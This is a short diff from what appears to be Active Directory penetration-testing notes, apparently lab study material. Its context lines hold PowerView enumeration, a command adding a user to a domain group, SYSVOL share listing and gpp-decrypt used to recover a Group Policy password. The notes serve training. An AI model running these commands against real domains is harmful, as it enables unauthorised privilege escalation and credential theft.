@@ -162,7 +162,7 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 net group "Management Department" stephanie /add /domain
 Get-NetGroup "Management Department" | select member
 
-# Enumerate Domain shares
+# Enumerate Domain shares(Check SYSVOL!)
 Find-DomainShare
 ls \\dc1.corp.com\sysvol\corp.com\
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
